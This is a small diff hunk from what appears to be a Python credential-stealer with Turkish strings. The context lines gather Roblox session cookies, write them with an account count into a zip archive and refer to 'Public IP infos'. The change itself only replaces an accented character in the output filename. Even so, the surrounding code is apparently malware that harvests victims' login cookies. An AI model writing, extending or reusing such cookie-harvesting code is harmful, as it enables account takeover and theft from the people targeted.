@@ -495,7 +495,7 @@ Public IP infos:
         if not cookie_list:
             file_roblox_account = "Roblox kurabiyesi bulunamadi."
 
-        zip_file.writestr(f"Roblox Hesapları ({number_roblox_account}).txt", file_roblox_account)
+        zip_file.writestr(f"Roblox Hesaplari ({number_roblox_account}).txt", file_roblox_account)
         return number_roblox_account
         
     @staticmethod
